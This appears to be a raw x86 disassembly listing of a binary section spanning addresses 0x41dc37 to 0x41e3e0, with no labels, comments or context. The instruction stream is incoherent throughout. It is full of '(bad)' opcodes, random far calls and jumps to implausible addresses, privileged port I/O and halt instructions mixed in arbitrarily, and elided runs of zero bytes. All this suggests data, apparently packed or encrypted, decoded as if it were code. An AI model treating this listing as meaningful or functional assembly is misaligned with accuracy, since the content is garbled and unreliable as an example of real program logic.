  41dc37:	mov    al,ds:0xe650836f
  41dc3c:	adc    eax,0x97ad3761
  41dc41:	dec    ecx
  41dc42:	mov    dh,0x4e
  41dc44:	jmp    0x5ea5ba20
  41dc49:	adc    BYTE PTR [ecx+0x71],cl
  41dc4c:	addr16 jns 0x41dca9
  41dc4f:	cwde   
  41dc50:	fcomp  DWORD PTR [edx+0x31]
  41dc53:	and    eax,DWORD PTR [ebx+0x43]
  41dc56:	or     eax,0x2b17e728
  41dc5b:	add    edi,esp
  41dc5d:	retf   
  41dc5e:	(bad)  
  41dc5f:	out    dx,eax
  41dc60:	hlt    
  41dc61:	out    0x0,al
  41dc63:	or     DWORD PTR [esi+0x34],ebx
  41dc66:	add    bl,BYTE PTR [ecx]
  41dc68:	bound  ebp,QWORD PTR [edi+ebp*8+0x1e]
  41dc6c:	or     al,0xe9
  41dc6e:	adc    cl,dl
  41dc70:	and    eax,0xe75d330c
  41dc75:	cmp    dl,ah
  41dc77:	cli    
  41dc78:	inc    edi
  41dc79:	fldcw  WORD PTR [ebx]
  41dc7b:	mov    bl,0xee
  41dc7d:	test   DWORD PTR [ebx],ebp
  41dc7f:	or     esp,DWORD PTR [ecx-0x1b0f3d33]
  41dc85:	mov    BYTE PTR [edi+0x47],al
  41dc88:	lock shl DWORD PTR [eax],0x7
  41dc8c:	call   0xc490:0x1c411e00
  41dc93:	sub    DWORD PTR [ebx+esi*2-0x1b],edx
  41dc97:	test   DWORD PTR ds:0x144a1858,edx
  41dc9d:	out    0x61,al
  41dc9f:	ret    
  41dca0:	mov    dl,0xd6
  41dca2:	push   ebx
  41dca3:	femms  
  41dca5:	push   ss
  41dca6:	sbb    dl,BYTE PTR [ebx-0x31]
  41dca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcaa:	mov    eax,0x559dfcd8
  41dcaf:	cmc    
  41dcb0:	loope  0x41dca1
  41dcb2:	add    eax,0xb8c949ad
  41dcb7:	ins    DWORD PTR es:[edi],dx
  41dcb8:	rol    DWORD PTR [ebx+0x3aa58b54],0x84
  41dcbf:	and    al,0x92
	...
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	push   edx
  41dccc:	add    al,0xa2
  41dcce:	xor    dh,0xa6
  41dcd1:	jb     0x41dca7
  41dcd3:	ins    DWORD PTR es:[edi],dx
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0xb1cca700
  41dcdb:	outs   dx,DWORD PTR ds:[esi]
  41dcdc:	fwait
  41dcdd:	add    DWORD PTR [eax],eax
  41dcdf:	scas   al,BYTE PTR es:[edi]
  41dce0:	add    BYTE PTR [eax],al
  41dce2:	add    BYTE PTR [ecx-0x35],al
  41dce5:	aad    0x45
  41dce7:	mov    edx,0xcdbfc146
  41dcec:	add    eax,0x67427dbd
  41dcf1:	imul   eax,DWORD PTR ds:0xa51e6176,0x7a
  41dcf8:	fisubr WORD PTR [eax+0x5aa02e98]
  41dcfe:	ins    DWORD PTR es:[edi],dx
  41dcff:	cs sub al,0xd4
  41dd02:	jecxz  0x41dd3a
  41dd04:	and    edi,0x8
  41dd07:	adc    bh,BYTE PTR [edi]
  41dd09:	ret    0x9044
  41dd0c:	jne    0x41dd71
  41dd0e:	lea    eax,[eax-0x73]
  41dd11:	xlat   BYTE PTR ds:[ebx]
  41dd12:	cmp    ah,BYTE PTR [edi]
  41dd14:	lock scas al,BYTE PTR es:[edi]
  41dd16:	xchg   bh,ch
  41dd18:	jmp    0x41dd76
  41dd1a:	repz cmp bh,BYTE PTR [eax-0x6d2588a1]
  41dd21:	test   DWORD PTR [edx+0x1bf8948f],eax
  41dd27:	stc    
  41dd28:	ret    
  41dd29:	test   ebx,0x16fed16e
  41dd2f:	mov    ss,WORD PTR [edx-0x6c401667]
  41dd35:	retf   
  41dd36:	sub    DWORD PTR gs:[edi+0x3c],0x18
  41dd3b:	jae    0x41ddb4
  41dd3d:	fisttp DWORD PTR [ebx+0x7e]
  41dd40:	sbb    cl,BYTE PTR [ecx+0x61]
  41dd43:	inc    ebx
  41dd44:	out    0xd9,eax
  41dd46:	pop    edx
  41dd47:	ret    0xe4a1
  41dd4a:	add    esp,esp
  41dd4c:	or     ebx,DWORD PTR ds:0xdfb3d1ab
  41dd52:	jp     0x41dcd7
  41dd54:	loop   0x41dd16
  41dd56:	pop    edx
  41dd57:	mov    BYTE PTR [ecx+0x76],bl
  41dd5a:	pop    esp
  41dd5b:	pop    ss
  41dd5c:	stos   BYTE PTR es:[edi],al
  41dd5d:	jns    0x41dd86
  41dd5f:	neg    ebp
  41dd61:	xor    ch,bl
  41dd63:	push   0x765d3dfa
  41dd68:	or     DWORD PTR [ecx],ebp
  41dd6a:	mov    ah,0x19
  41dd6c:	xchg   BYTE PTR [ebp-0x69],ah
  41dd6f:	shr    BYTE PTR [edx+eax*2],1
  41dd72:	or     esi,DWORD PTR [ecx]
  41dd74:	btc    eax,ecx
  41dd77:	ret    
  41dd78:	(bad)  
  41dd79:	mov    eax,ds:0x12ddf56c
  41dd7e:	in     al,0xe
  41dd80:	dec    edi
  41dd81:	adc    BYTE PTR [ecx+0x4c],dl
  41dd84:	push   0x50d04015
  41dd89:	push   es
  41dd8a:	in     al,dx
  41dd8b:	sbb    ecx,DWORD PTR [edi+0x7fe0f1fb]
	...
  41dd99:	add    BYTE PTR [eax],al
  41dd9b:	cmp    BYTE PTR [edx-0x6a],ch
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0xa7,eax
  41dda8:	pushf  
  41dda9:	cmp    esi,DWORD PTR [edi+0x1d]
  41ddac:	pushf  
  41ddad:	add    DWORD PTR [eax],eax
  41ddaf:	scas   al,BYTE PTR es:[edi]
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    BYTE PTR ds:0x7aa6fe3e,bh
  41ddb8:	push   0x723e519f
  41ddbd:	xchg   esi,eax
  41ddbe:	dec    edx
  41ddbf:	push   esi
  41ddc0:	lods   eax,DWORD PTR ds:[esi]
  41ddc1:	or     ch,BYTE PTR [esi-0x20b739aa]
  41ddc7:	sbb    DWORD PTR [edx-0x78],ecx
  41ddca:	jo     0x41ddc9
  41ddcc:	sub    al,0x9f
  41ddce:	out    dx,al
  41ddcf:	and    BYTE PTR [edx-0x4a],ch
  41ddd2:	cmovnp ebx,DWORD PTR [edi+0x28]
  41ddd6:	xchg   ecx,eax
  41ddd7:	dec    ebp
  41ddd8:	call   0x236ddc5f
  41dddd:	(bad)  
  41ddde:	xchg   edi,eax
  41dddf:	pop    esp
  41dde0:	or     eax,0xa1b7660a
  41dde5:	cmc    
  41dde6:	pop    esi
  41dde7:	xchg   esp,eax
  41dde8:	inc    edx
  41dde9:	xchg   ebp,eax
  41ddea:	push   ds
  41ddeb:	sbb    ecx,DWORD PTR [edi]
  41dded:	and    BYTE PTR [edi-0x67],0xf3
  41ddf1:	sub    cl,BYTE PTR [ecx]
  41ddf3:	push   eax
  41ddf4:	sub    BYTE PTR [eax+0x7fc395aa],0xdb
  41ddfb:	and    eax,0xe3e9db29
  41de00:	jecxz  0x41dda1
  41de02:	in     al,0xba
  41de04:	(bad)  
  41de06:	xchg   DWORD PTR [ecx+0x54],edx
  41de09:	lahf   
  41de0a:	and    bh,BYTE PTR [ecx-0x7609abdb]
  41de10:	mov    eax,ds:0xedcadaf8
  41de15:	test   eax,0xdc18b1b5
  41de1a:	or     esi,DWORD PTR [ebx+0x1c]
  41de1d:	imul   edx,DWORD PTR [ecx+0x28],0xc9212aba
  41de24:	jo     0x41de07
  41de26:	lds    eax,FWORD PTR [ebp-0x61a731e0]
  41de2c:	adc    eax,0x11e368b8
  41de31:	sub    BYTE PTR [esi+0x125f2fc7],ch
  41de37:	bound  ecx,QWORD PTR [ecx-0x50]
  41de3a:	push   ds
  41de3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de3c:	and    eax,0x86551507
  41de41:	dec    BYTE PTR [edi-0xc9635b8]
  41de47:	or     eax,0xdb662c78
  41de4c:	pop    edx
  41de4d:	inc    esp
  41de4e:	int3   
  41de4f:	or     esi,DWORD PTR [ecx+0x74af4058]
  41de55:	daa    
  41de56:	add    eax,0x6d9333a0
  41de5b:	sbb    eax,0x5f810a5f
  41de60:	add    BYTE PTR fs:[eax],al
	...
  41de6b:	jmp    0x7a725929
  41de70:	repz jmp 0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	push   esp
  41de78:	test   eax,0x9ccb8532
  41de7d:	add    DWORD PTR [eax],eax
  41de7f:	scas   al,BYTE PTR es:[edi]
  41de80:	add    BYTE PTR [eax],al
  41de82:	add    BYTE PTR [ecx+ecx*8+0x22d50986],dl
  41de89:	cmp    bl,BYTE PTR fs:[ecx+eiz*4]
  41de8d:	cli    
  41de8e:	or     DWORD PTR [edx+0x2aee6463],esi
  41de94:	mov    bl,0x7
  41de96:	mov    esi,0xe646ece8
  41de9b:	adc    al,0xe7
  41de9d:	popa   
  41de9e:	pop    esi
  41de9f:	sbb    eax,0xdc1d2753
  41dea4:	mov    DWORD PTR [edx-0x42541098],edx
  41deaa:	jmp    0x504a:0x830b2d3b
  41deb1:	dec    ebp
  41deb2:	jmp    0x41ded8
  41deb4:	mov    edx,DWORD PTR [edx+0x27]
  41deb7:	inc    ebx
  41deb8:	imul   eax,DWORD PTR [esi-0x4c],0x9
  41debc:	imul   edx,eax,0xffffff90
  41debf:	icebp  
  41dec0:	std    
  41dec1:	faddp  st(4),st
  41dec3:	ror    ecx,0x56
  41dec6:	sub    cl,bh
  41dec8:	mov    ecx,0xf99ae880
  41decd:	ins    BYTE PTR es:[edi],dx
  41dece:	push   0x2c
  41ded0:	dec    ebp
  41ded1:	outs   dx,DWORD PTR ds:[esi]
  41ded2:	add    al,0x6f
  41ded4:	xchg   DWORD PTR [edx+0x17],edi
  41ded7:	adc    edx,DWORD PTR [ebx-0x4b]
  41deda:	lock mov ds:0xe4002c3b,eax
  41dee0:	inc    edx
  41dee1:	outs   dx,BYTE PTR ds:[esi]
  41dee2:	pop    esi
  41dee3:	fistp  DWORD PTR [edx]
  41dee5:	test   al,0x7
  41dee7:	mov    WORD PTR [eax+eiz*4-0x355eea94],?
  41deee:	stos   BYTE PTR es:[edi],al
  41deef:	jo     0x41df61
  41def1:	jno    0x41df13
  41def3:	(bad)  
  41def4:	lock jge 0x41deed
  41def7:	or     DWORD PTR [ebp+0x61860659],esi
  41defd:	or     esi,ebp
  41deff:	popf   
  41df00:	add    eax,0xb0a4a6ba
  41df05:	xor    al,0xc8
  41df07:	sub    dh,BYTE PTR [ecx-0x60f6e5ae]
  41df0d:	data16 jecxz 0x41dec9
  41df10:	add    cl,BYTE PTR [ecx-0x2d528e2a]
  41df16:	sti    
  41df17:	mov    edi,0x9d6b05b1
  41df1c:	(bad)  
  41df1d:	mov    ecx,0x12fed2c9
  41df22:	inc    ebp
  41df23:	fsub   QWORD PTR [edx]
  41df25:	push   ebp
  41df26:	popa   
  41df27:	sbb    al,0xc6
  41df29:	call   0xc02de7ad
  41df2e:	pushf  
  41df2f:	xchg   ebp,edx
	...
  41df39:	add    BYTE PTR [eax],al
  41df3b:	pop    ebx
  41df3c:	inc    ecx
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	dec    ecx
  41df48:	or     dh,BYTE PTR [ecx+ebp*4]
  41df4b:	jns    0x41deea
  41df4d:	add    DWORD PTR [eax],eax
  41df4f:	scas   al,BYTE PTR es:[edi]
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    BYTE PTR [edx+esi*8],al
  41df55:	dec    eax
  41df56:	pop    ds
  41df57:	sub    DWORD PTR [edx-0x39a78606],eax
  41df5d:	out    dx,al
  41df5e:	xchg   edi,eax
  41df5f:	inc    ebx
  41df60:	scas   al,BYTE PTR es:[edi]
  41df61:	pop    eax
  41df62:	test   DWORD PTR [edx+0x58],ecx
  41df65:	add    BYTE PTR [esi+0x39e40d6e],bh
  41df6b:	enter  0x4f5d,0xae
  41df6f:	aad    0xa5
  41df71:	or     dl,dl
  41df73:	mov    BYTE PTR [edi],dh
  41df75:	push   ss
  41df76:	adc    ebx,DWORD PTR [ebx]
  41df78:	pop    edx
  41df79:	mov    ?,ebp
  41df7b:	bound  ecx,QWORD PTR [eax-0x4708a705]
  41df81:	pop    ss
  41df82:	cld    
  41df83:	repnz xor ecx,esi
  41df86:	sub    DWORD PTR [edi+0x76ac7375],esp
  41df8c:	sub    BYTE PTR [edx+edi*8],al
  41df8f:	xchg   esi,eax
  41df90:	mov    bh,BYTE PTR [edx+0x7e]
  41df93:	nop    DWORD PTR [ebp+0x66]
  41df97:	bound  ecx,QWORD PTR [ebx+0x4bbbe3c5]
  41df9d:	cmp    DWORD PTR [eax-0x14],eax
  41dfa0:	pop    es
  41dfa1:	inc    ecx
  41dfa2:	popf   
  41dfa3:	fisub  DWORD PTR [esp+eax*4+0x5ae82668]
  41dfaa:	cdq    
  41dfab:	mov    eax,fs
  41dfad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfae:	push   ecx
  41dfaf:	lea    ecx,[edi]
  41dfb1:	and    dl,BYTE PTR [ebx+eiz*4+0x2eb7c9e6]
  41dfb8:	cmp    eax,0xcc937011
  41dfbd:	pop    ecx
  41dfbe:	test   ah,dh
  41dfc0:	(bad)  
  41dfc1:	push   0x4c8d8e9c
  41dfc6:	sbb    al,0x23
  41dfc8:	int3   
  41dfc9:	and    DWORD PTR [edi+0xf],0x6e
  41dfcd:	xor    DWORD PTR [ebx+esi*4-0x46],eax
  41dfd1:	and    DWORD PTR [ebx+0x36],eax
  41dfd4:	add    al,0xf
  41dfd6:	fs stc 
  41dfd8:	ins    DWORD PTR es:[edi],dx
  41dfd9:	pop    edi
  41dfda:	jae    0x41dffb
  41dfdc:	out    0x1a,eax
  41dfde:	arpl   si,ax
  41dfe0:	mov    ds:0xc252e9eb,al
  41dfe5:	addr16 sub eax,0xd4da2517
  41dfeb:	cli    
  41dfec:	pop    ds
  41dfed:	stos   DWORD PTR es:[edi],eax
  41dfee:	pop    es
  41dfef:	(bad)  
  41dff0:	jo     0x41df72
  41dff2:	sbb    eax,0xff8a8c5f
  41dff7:	mov    dh,0x57
  41dff9:	adc    DWORD PTR [edx+0x60116ab8],ebx
  41dfff:	add    eax,0x81
  41e004:	add    BYTE PTR [eax],al
  41e006:	add    BYTE PTR [eax],al
  41e008:	add    BYTE PTR [eax],al
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	mov    ecx,0x27f6f448
  41e01c:	sahf   
  41e01d:	add    DWORD PTR [eax],eax
  41e01f:	scas   al,BYTE PTR es:[edi]
  41e020:	add    BYTE PTR [eax],al
  41e022:	add    BYTE PTR [ebx+0x4af132c4],ch
  41e028:	(bad)  
  41e029:	and    al,0x51
  41e02b:	cdq    
  41e02c:	stos   BYTE PTR es:[edi],al
  41e02d:	add    eax,0xde096c12
  41e032:	inc    ecx
  41e033:	push   ebp
  41e034:	adc    BYTE PTR [ebx-0x12875573],al
  41e03a:	xchg   edi,eax
  41e03b:	pop    ds
  41e03c:	jno    0x41dfdd
  41e03e:	pushf  
  41e03f:	js     0x41e07f
  41e041:	dec    ecx
  41e042:	push   edx
  41e043:	fisub  DWORD PTR [edi]
  41e045:	sub    ebx,DWORD PTR [edi+0x67]
  41e048:	pop    eax
  41e049:	loopne 0x41e0c6
  41e04b:	bound  ebx,QWORD PTR [ecx-0x6a]
  41e04e:	adc    edx,edx
  41e050:	pop    ecx
  41e051:	or     eax,0x860a8af9
  41e056:	push   ecx
  41e057:	punpckhwd mm2,QWORD PTR [ebx+0x24fea673]
  41e05e:	adc    DWORD PTR ds:0xf8361735,esp
  41e064:	ds jns 0x41dfeb
  41e067:	pop    edi
  41e068:	fdiv   DWORD PTR [eax+ebp*4]
  41e06b:	jle    0x41e0db
  41e06d:	loopne 0x41dff6
  41e06f:	xor    DWORD PTR [esi+0x9],esp
  41e072:	imul   edi,DWORD PTR [edx-0x3cd9ff40],0x2b046044
  41e07c:	shl    DWORD PTR [ebx+0x2c],cl
  41e07f:	mov    esp,0x25d8784
  41e084:	cmp    cl,BYTE PTR [ebp+0x14]
  41e087:	jl     0x41e05c
  41e089:	and    DWORD PTR [edi+0x60cbc78e],0x6e
  41e090:	aaa    
  41e091:	push   esp
  41e092:	dec    ebp
  41e093:	pop    ebx
  41e094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e095:	jg     0x41e0f2
  41e097:	(bad)  
  41e098:	test   al,0x70
  41e09a:	scas   eax,DWORD PTR es:[edi]
  41e09b:	or     eax,0x8102afa0
  41e0a0:	sbb    al,dh
  41e0a2:	jl     0x41e09f
  41e0a4:	add    ah,0xe0
  41e0a7:	mov    eax,0x3fd7d2a0
  41e0ac:	(bad)  
  41e0ad:	cld    
  41e0ae:	or     edi,DWORD PTR [ebx+ebp*8]
  41e0b1:	mov    edi,0x5d4570c2
  41e0b6:	cmp    dl,0x87
  41e0b9:	es cld 
  41e0bb:	idiv   DWORD PTR [eax]
  41e0bd:	add    esi,DWORD PTR [ebx]
  41e0bf:	push   es
  41e0c0:	scas   eax,DWORD PTR es:[edi]
  41e0c1:	imul   ebx,eax,0x1d
  41e0c4:	pop    esp
  41e0c5:	in     al,dx
  41e0c6:	mov    WORD PTR [edi],?
  41e0c8:	cmp    eax,0xe3d3644a
  41e0cd:	inc    esp
  41e0ce:	fwait
  41e0cf:	or     DWORD PTR [ecx+0x0],ebp
	...
  41e0da:	add    BYTE PTR [esi+0x73],ch
  41e0dd:	lock retf 0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0x45728ce9
  41e0e9:	add    dh,0xd5
  41e0ec:	sahf   
  41e0ed:	add    DWORD PTR [eax],eax
  41e0ef:	scas   al,BYTE PTR es:[edi]
  41e0f0:	add    BYTE PTR [eax],al
  41e0f2:	add    BYTE PTR [ecx-0x6836985e],bh
  41e0f8:	aaa    
  41e0f9:	nop
  41e0fa:	mov    DWORD PTR [ebp+0x55],0x9573146d
  41e101:	out    0xe0,eax
  41e103:	lahf   
  41e104:	in     eax,0xee
  41e106:	(bad)  
  41e107:	sub    DWORD PTR [esi],ebp
  41e109:	out    dx,eax
  41e10a:	jge    0x41e136
  41e10c:	fistp  DWORD PTR [ebx]
  41e10e:	test   DWORD PTR [esi+0x5e50da2b],esp
  41e114:	sbb    BYTE PTR [esi+0x6ff3932e],ah
  41e11a:	popa   
  41e11b:	clc    
  41e11c:	jbe    0x41e108
  41e11e:	repnz aad 0x80
  41e121:	mov    edx,DWORD PTR [edi]
  41e123:	sub    bl,BYTE PTR [ecx-0x4c]
  41e126:	je     0x41e11b
  41e128:	jno    0x41e168
  41e12a:	sbb    cl,ch
  41e12c:	pop    edx
  41e12d:	dec    ecx
  41e12e:	adc    ebp,DWORD PTR [edx]
  41e130:	iret   
  41e131:	ja     0x41e145
  41e133:	fwait
  41e134:	(bad)  
  41e135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e136:	in     al,0xf7
  41e138:	jg     0x41e155
  41e13a:	mov    ch,0x25
  41e13c:	sbb    eax,0x3bf6520f
  41e141:	xchg   esp,eax
  41e142:	mov    ch,0xef
  41e144:	fist   WORD PTR [edi-0x76f06bcf]
  41e14a:	cs add eax,0xa82ebde1
  41e150:	popa   
  41e151:	inc    edx
  41e152:	adc    eax,DWORD PTR [esp+ebx*8-0x68ad8c12]
  41e159:	xlat   BYTE PTR ds:[ebx]
  41e15a:	das    
  41e15b:	push   esp
  41e15c:	idiv   DWORD PTR [ebx-0x7a]
  41e15f:	mov    cl,0x1e
  41e161:	loop   0x41e16f
  41e163:	ins    BYTE PTR es:[edi],dx
  41e164:	adc    al,0x34
  41e166:	outs   dx,DWORD PTR ds:[esi]
  41e167:	inc    esp
  41e168:	fs ja  0x41e106
  41e16b:	jae    0x41e146
  41e16d:	pushf  
  41e16e:	mov    ds:0x7cf89d0c,eax
  41e173:	jns    0x41e0f9
  41e175:	js     0x41e1eb
  41e177:	mov    edx,0x681747ca
  41e17c:	dec    ebp
  41e17d:	cwde   
  41e17e:	in     al,0x4e
  41e180:	cld    
  41e181:	inc    esp
  41e182:	jne    0x41e1d1
  41e184:	test   BYTE PTR [esi-0x48],dl
  41e187:	pop    eax
  41e188:	mov    bl,0x9d
  41e18a:	inc    ebp
  41e18b:	mov    ds:0x362e3e40,al
  41e190:	test   al,0xfa
  41e192:	pushf  
  41e193:	cwd    
  41e195:	fnstsw WORD PTR [ecx]
  41e197:	inc    edx
  41e198:	inc    ebp
  41e199:	adc    ecx,edi
  41e19b:	mov    bl,0x66
  41e19d:	(bad)  
  41e19e:	xchg   esp,eax
  41e19f:	mov    ebx,0x28
  41e1a4:	add    BYTE PTR [eax],al
  41e1a6:	add    BYTE PTR [eax],al
  41e1a8:	add    BYTE PTR [eax],al
  41e1aa:	add    ch,dh
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx-0x656f75e9]
  41e1bb:	sbb    DWORD PTR [edi+0xae0001],0x0
  41e1c2:	add    BYTE PTR [esi-0x55358f48],dl
  41e1c8:	lds    ecx,FWORD PTR [esi+0x7ef6297e]
  41e1ce:	mov    ds:0x5b392b00,al
  41e1d3:	sub    bh,BYTE PTR [edi-0x6352592f]
  41e1d9:	outs   dx,BYTE PTR ds:[esi]
  41e1da:	enter  0xe68,0xd5
  41e1de:	loop   0x41e1e9
  41e1e0:	inc    ebp
  41e1e1:	loop   0x41e217
  41e1e3:	sub    al,0xe7
  41e1e5:	into   
  41e1e6:	cwde   
  41e1e7:	dec    esi
  41e1e8:	loop   0x41e1b6
  41e1ea:	aad    0x3e
  41e1ec:	cmp    al,0x4c
  41e1ee:	sar    BYTE PTR [esi],1
  41e1f0:	hlt    
  41e1f1:	xchg   esi,eax
  41e1f2:	add    al,0x60
  41e1f4:	cdq    
  41e1f5:	mov    edi,0x4b401c05
  41e1fa:	pop    es
  41e1fb:	bound  ebp,QWORD PTR [edi+0x3d93f815]
  41e201:	es out dx,eax
  41e203:	hlt    
  41e204:	or     esp,ebp
  41e206:	pop    ds
  41e207:	inc    ebx
  41e208:	aam    0x69
  41e20a:	sbb    esi,DWORD PTR [ecx+0x10d430b1]
  41e210:	mov    DWORD PTR [ecx+0x6486b29f],esi
  41e216:	or     DWORD PTR ds:0x478021ab,0x8f46512d
  41e220:	hlt    
  41e221:	sbb    al,0x3b
  41e223:	repz mov al,0xbf
  41e226:	cmp    al,0xf1
  41e228:	loop   0x41e236
  41e22a:	(bad)  
  41e22b:	jg     0x41e247
  41e22d:	(bad)  
  41e22e:	push   eax
  41e22f:	imul   ebp,DWORD PTR [eax-0x5ca44a09],0xc323698b
  41e239:	adc    eax,0xb2e20a33
  41e23e:	scas   eax,DWORD PTR es:[edi]
  41e23f:	pop    esi
  41e240:	repz leave 
  41e242:	or     ch,0x83
  41e245:	push   0x6f
  41e247:	add    dl,ah
  41e249:	inc    eax
  41e24a:	push   ds
  41e24b:	mov    cl,0x9
  41e24d:	cmp    al,0xc5
  41e24f:	out    dx,al
  41e250:	stc    
  41e251:	push   ecx
  41e252:	mov    dl,0xdd
  41e254:	rcl    ecx,1
  41e256:	cmc    
  41e257:	retf   
  41e258:	mov    ds:0x6659af9b,al
  41e25d:	sbb    edi,DWORD PTR [edi-0x2b]
  41e260:	(bad)  
  41e261:	fnstcw WORD PTR [edx-0x14]
  41e264:	and    ebp,DWORD PTR [ebp-0x2431b746]
  41e26a:	xchg   esp,eax
  41e26b:	xchg   ebx,eax
  41e26c:	scas   eax,DWORD PTR es:[edi]
  41e26d:	popf   
  41e26e:	or     DWORD PTR [edx-0x2a],ebx
	...
  41e279:	add    BYTE PTR [eax],al
  41e27b:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  41e281:	mov    edi,0xbb1c16fb
  41e286:	shr    BYTE PTR [edx],0x74
  41e289:	retf   
  41e28a:	rdtsc  
  41e28c:	mov    al,ds:0xae0001
  41e291:	add    BYTE PTR [eax],al
  41e293:	inc    ecx
  41e294:	call   0xe719:0xcc373763
  41e29b:	enter  0x50fc,0xf4
  41e29f:	or     dh,BYTE PTR ds:0x85dd0b15
  41e2a5:	arpl   WORD PTR [eax+0x4e],dx
  41e2a8:	dec    ecx
  41e2a9:	call   0xce17:0xbea53696
  41e2b0:	mov    eax,ds:0xf66ba0f7
  41e2b5:	jmp    0x77cdbc11
  41e2ba:	add    esi,DWORD PTR [ebx*2-0x145340be]
  41e2c1:	cmp    BYTE PTR ds:0x12cb0898,ah
  41e2c7:	jo     0x41e2ea
  41e2c9:	lods   al,BYTE PTR ds:[esi]
  41e2ca:	les    ebx,FWORD PTR [esi-0x6ce2c1ed]
  41e2d0:	dec    ebp
  41e2d1:	sub    eax,0x4dc5785f
  41e2d6:	xor    bl,0xd7
  41e2d9:	mov    dh,0xcd
  41e2db:	pop    ds
  41e2dc:	out    dx,eax
  41e2dd:	cli    
  41e2de:	stos   DWORD PTR es:[edi],eax
  41e2df:	sahf   
  41e2e0:	out    dx,al
  41e2e1:	popf   
  41e2e2:	xchg   edx,eax
  41e2e3:	loop   0x41e2fb
  41e2e5:	mov    ds:0xe3b5e06f,eax
  41e2ea:	sbb    DWORD PTR [ebx-0x13],eax
  41e2ed:	dec    eax
  41e2ee:	data16 jae 0x41e27a
  41e2f1:	jl     0x41e29a
  41e2f3:	sub    esp,DWORD PTR [ebx+0x324de96a]
  41e2f9:	shl    DWORD PTR [edx],1
  41e2fb:	xchg   eax,edx
  41e2fd:	and    al,0x38
  41e2ff:	cmp    ch,dh
  41e301:	xchg   esi,eax
  41e302:	out    dx,eax
  41e303:	pop    esi
  41e304:	sub    ebx,0xa
  41e307:	jne    0x41e320
  41e309:	or     eax,0x9a5f630
  41e30e:	and    esi,DWORD PTR [eax]
  41e310:	push   ecx
  41e311:	cmovbe ecx,DWORD PTR ds:0x5528ef8a
  41e318:	clc    
  41e319:	mov    WORD PTR [ecx],gs
  41e31b:	js     0x41e327
  41e31d:	scas   al,BYTE PTR es:[edi]
  41e31e:	mov    ecx,0x57ed48b6
  41e323:	popa   
  41e324:	lods   eax,DWORD PTR ds:[esi]
  41e325:	or     al,ch
  41e327:	ret    
  41e328:	(bad)  
  41e329:	ins    DWORD PTR es:[edi],dx
  41e32a:	xor    DWORD PTR [edx-0x631ea071],esp
  41e330:	stos   BYTE PTR es:[edi],al
  41e331:	cld    
  41e332:	inc    edx
  41e333:	push   ebx
  41e334:	push   es
  41e335:	mov    esp,DWORD PTR [eax+eiz*1]
  41e338:	clc    
  41e339:	xchg   ebp,eax
  41e33a:	or     BYTE PTR [edx],dh
  41e33c:	adc    ebx,DWORD PTR [ebp-0x58]
  41e33f:	cmp    al,bl
	...
  41e349:	add    BYTE PTR [eax],al
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	shr    DWORD PTR [esi-0x57],cl
  41e35a:	aas    
  41e35b:	fbld   TBYTE PTR [eax+0xae0001]
  41e361:	add    BYTE PTR [eax],al
  41e363:	test   DWORD PTR [eax-0x48e9b392],0xa7689e1c
  41e36d:	or     esp,DWORD PTR [ebx+0x6]
  41e370:	cmc    
  41e371:	and    ecx,DWORD PTR [esp+ebp*2-0x106d877f]
  41e378:	gs (bad) 
  41e37a:	jae    0x41e34a
  41e37c:	cld    
  41e37d:	aas    
  41e37e:	pop    es
  41e37f:	sub    esi,edx
  41e381:	ds pop eax
  41e383:	push   cs
  41e384:	pop    es
  41e385:	mov    cl,0x8d
  41e387:	movhps xmm7,QWORD PTR [esi-0x64]
  41e38b:	mov    bh,0x9f
  41e38d:	sbb    al,0x9b
  41e38f:	lods   al,BYTE PTR ds:[esi]
  41e390:	(bad)  
  41e392:	scas   eax,DWORD PTR es:[edi]
  41e393:	mov    edi,0x50fafeb5
  41e398:	pop    ebp
  41e399:	setae  BYTE PTR [ebx]
  41e39c:	sub    ecx,DWORD PTR [eax-0x679c24ad]
  41e3a2:	pop    eax
  41e3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3a4:	cwde   
  41e3a5:	ins    DWORD PTR es:[edi],dx
  41e3a6:	or     DWORD PTR [ebx+0x4c],ecx
  41e3a9:	(bad)  
  41e3ab:	lds    ecx,FWORD PTR [ebp-0x6d0a688b]
  41e3b1:	popa   
  41e3b2:	mov    cl,0xf0
  41e3b4:	out    dx,eax
  41e3b5:	jl     0x41e345
  41e3b7:	fdiv   QWORD PTR [eax-0x25c3d7ed]
  41e3bd:	repz mov WORD PTR [esi+0x5d7e0bc5],ds
  41e3c4:	jmp    0x41e380
  41e3c6:	(bad)
  41e3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3cb:	sub    BYTE PTR [edi+eax*2-0x985b2e2],dl
  41e3d2:	dec    ebp
  41e3d3:	in     eax,dx
  41e3d4:	loop   0x41e430
  41e3d6:	aam    0xc3
  41e3d8:	das    
  41e3d9:	fadd   DWORD PTR ss:[eax+eiz*4]
  41e3dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3de:	push   ss
  41e3df:	pop    ss
  41e3e0:	test   eax,0x39740e3f
